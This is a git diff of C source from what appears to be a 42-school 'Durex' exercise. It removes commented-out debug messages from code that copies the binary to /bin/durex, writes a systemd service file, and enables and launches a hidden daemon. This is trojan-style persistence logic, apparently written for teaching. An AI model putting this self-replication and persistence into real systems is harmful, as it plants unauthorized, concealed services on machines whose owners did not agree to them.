@@ -6,7 +6,7 @@
 /*   By: user42 <user42@student.42.fr>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2022/02/08 15:10:04 by user42            #+#    #+#             */
-/*   Updated: 2022/02/11 15:33:08 by user42           ###   ########.fr       */
+/*   Updated: 2022/02/14 12:01:21 by user42           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -74,10 +74,7 @@ void	get_systemd_folder(t_durex_bin *durex_bin)
 	args[2] = "systemd";
 	args[3] = NULL;
 	if (exec_safe_w_output("pkg-config", args, durex_bin->systemd_folder) != 0)
-	{
-//		printf("[*] Couldn't find systemd folder with pkg-config. Falling back to default systemd directory.\n");
 		strcpy(durex_bin->systemd_folder, "/etc/systemd/system");
-	}
 	free(args);
 }
 
@@ -136,15 +133,10 @@ void	launch_durex_daemon(void)
 void	setup_daemon(t_durex_bin *durex_bin)
 {
 	clear_env();
-//	printf("[+] Successfully cleared environment.\n");
 	get_systemd_folder(durex_bin);
-//	printf("[+] Successfully retrieved systemd .service folder.\n");
 	create_config_file(durex_bin);
-//	printf("[+] Successfully wrote the daemon config file.\n");
 	enable_durex_daemon();
-//	printf("[+] Successfully enabled durex daemon.\n");
 	launch_durex_daemon();
-//	printf("[+] Successfully started durex daemon.\n");
 	return ;
 }
 
@@ -153,11 +145,8 @@ void	durex_bin(void)
 	t_durex_bin		durex_bin;
 
 	init_durex_bin(&durex_bin);
-//	printf("[*] This is the original Durex binary. Setting up daemon...\n");
 	self_replicate_to_target();
-//	printf("[+] Successfully self-replicated to /bin/durex.\n");
 	setup_daemon(&durex_bin);
-//	printf("[+] Durex daemon setup complete. We will clean and exit.\n");
 	printf("qroland\n");
 	clean_durex_bin(&durex_bin);
 }
